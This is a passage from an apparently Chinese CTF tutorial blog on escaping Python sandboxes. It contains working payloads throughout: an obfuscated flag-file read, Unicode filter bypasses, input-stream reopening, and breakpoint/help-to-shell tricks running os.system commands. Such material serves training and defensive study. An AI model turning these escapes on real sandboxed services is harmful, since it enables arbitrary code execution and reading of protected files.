&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;a=ord;b=a(&amp;#x27;ō&amp;#x27;);print(open(bytes([b-a(&amp;#x27;ç&amp;#x27;),b-a(&amp;#x27;á&amp;#x27;),b-a(&amp;#x27;ì&amp;#x27;),b-a(&amp;#x27;æ&amp;#x27;),b-a(&amp;#x27;ğ&amp;#x27;),b-a(&amp;#x27;Ù&amp;#x27;),b-a(&amp;#x27;Õ&amp;#x27;),b-a(&amp;#x27;Ù&amp;#x27;)])).read())&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower () 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr (4434)&lt;/p&gt;
&lt;p&gt;当然，可以直接使用 input 函数来绕过长度限制。&lt;/p&gt;
&lt;h4 id=&#34;打开-input-输入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#打开-input-输入&#34;&gt;#&lt;/a&gt; 打开 input 输入&lt;/h4&gt;
&lt;p&gt;如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。&lt;/p&gt;
&lt;p&gt;以 BYUCTF2023 jail a-z0-9 为例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;((&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;re&amp;quot;&lt;/span&gt;).sub(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;[a-z0-9]&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;code &amp;gt; &amp;quot;&lt;/span&gt;).lower()))[:&lt;span class=&#34;number&#34;&gt;130&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）&lt;br&gt;
()&lt;br&gt;
 这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。&lt;/p&gt;
&lt;p&gt;下面是一些打开输入流的方式:&lt;/p&gt;
&lt;h5 id=&#34;sysstdinread&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sysstdinread&#34;&gt;#&lt;/a&gt; sys.stdin.read()&lt;/h5&gt;
&lt;p&gt;注意输入完毕之后按 ctrl+d 结束输入&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(sys.stdin.read())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;sysstdinreadline&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sysstdinreadline&#34;&gt;#&lt;/a&gt; sys.stdin.readline()&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(sys.stdin.readline())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;sysstdinreadlines&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sysstdinreadlines&#34;&gt;#&lt;/a&gt; sys.stdin.readlines()&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(sys.stdin.readlines()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在 python2 中，在 python 2 中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。&lt;/p&gt;
&lt;h4 id=&#34;breakpoint-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#breakpoint-函数&#34;&gt;#&lt;/a&gt; breakpoint 函数&lt;/h4&gt;
&lt;p&gt;pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。&lt;/p&gt;
&lt;p&gt;在输入 breakpoint () 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码&lt;/p&gt;
&lt;h3 id=&#34;help-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#help-函数&#34;&gt;#&lt;/a&gt; help 函数&lt;/h3&gt;
&lt;p&gt;help 函数可以打开帮助文档。索引到 os 模块之后可以打开 sh&lt;/p&gt;
&lt;p&gt;当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助&lt;/p&gt;
&lt;p&gt;然后输入 os, 此时会进入 os 的帮助文档。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;help&amp;gt; os&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;然后在输入  &lt;code&gt;!sh&lt;/code&gt;  就可以拿到 /bin/sh, 输入  &lt;code&gt;!bash&lt;/code&gt;  则可以拿到 /bin/bash&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;help&amp;gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a-z0-9.py  exp2.py  exp.py  flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;绕过多行限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过多行限制&#34;&gt;#&lt;/a&gt; 绕过多行限制&lt;/h3&gt;
&lt;p&gt;绕过多行限制的利用手法通常在限制了单行代码的情况下使用，例如 eval, 中间如果存在；或者换行会报错。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;__import__(&amp;#x27;os&amp;#x27;);print(1)&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;string&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;);&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;exec&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exec&#34;&gt;#&lt;/a&gt; exec&lt;/h4&gt;
&lt;p&gt;exec 可以支持换行符与 &lt;code&gt;;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec(&amp;#x27;__import__(\&amp;quot;os\&amp;quot;)\\nprint(1)&amp;#x27;)&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;compile&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#compile&#34;&gt;#&lt;/a&gt; compile&lt;/h4&gt;
&lt;p&gt;compile 在 single 模式下也同样可以使用 \n 进行换行，在 exec 模式下可以直接执行多行代码.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;eval(compile(&amp;#x27;print(&amp;quot;hello world&amp;quot;); print(&amp;quot;heyy&amp;quot;)&amp;#x27;, &amp;#x27;&amp;lt;stdin&amp;gt;&amp;#x27;, &amp;#x27;exec&amp;#x27;))&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;海象表达式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#海象表达式&#34;&gt;#&lt;/a&gt; 海象表达式&lt;/h4&gt;
&lt;p&gt;海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。&lt;/p&gt;
&lt;p&gt;海象表达式的语法形式如下：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;expression&amp;gt; := &amp;lt;value&amp;gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &amp;lt;condition&amp;gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;lt;value&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;借助海象表达式，我们可以通过列表来替代多行代码：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;[a:=__import__(&amp;quot;os&amp;quot;),b:=a.system(&amp;quot;id&amp;quot;)]&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uid=&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;(kali) gid=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;(root) groups=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;(root),&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;(adm),&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;(dialout),&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;(cdrom),&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;(floppy),&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;(sudo),&lt;span class=&#34;number&#34;&gt;29&lt;/span&gt;(audio),&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;(dip),&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;(video),&lt;span class=&#34;number&#34;&gt;46&lt;/span&gt;(plugdev),&lt;span class=&#34;number&#34;&gt;109&lt;/span&gt;(netdev),&lt;span class=&#34;number&#34;&gt;119&lt;/span&gt;(wireshark),&lt;span class=&#34;number&#34;&gt;122&lt;/span&gt;(bluetooth),&lt;span class=&#34;number&#34;&gt;134&lt;/span&gt;(scanner),&lt;span class=&#34;number&#34;&gt;142&lt;/span&gt;(kaboxer)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&amp;lt;module &lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt; (frozen)&amp;gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;变量覆盖与函数篡改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#变量覆盖与函数篡改&#34;&gt;#&lt;/a&gt; 变量覆盖与函数篡改&lt;/h3&gt;
&lt;p&gt;在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.&lt;/p&gt;
&lt;p&gt;sys.modules 存放了现有模块的引用，通过访问  &lt;code&gt;sys.modules[&#39;__main__&#39;]&lt;/code&gt;  就可以访问当当前模块定义的所有函数以及全局变量&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;aaa = &lt;span class=&#34;string&#34;&gt;&amp;#x27;bbb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;my_input&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;    dict_global = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          input_data = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; EOFError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;bye~~&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; input_data == &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 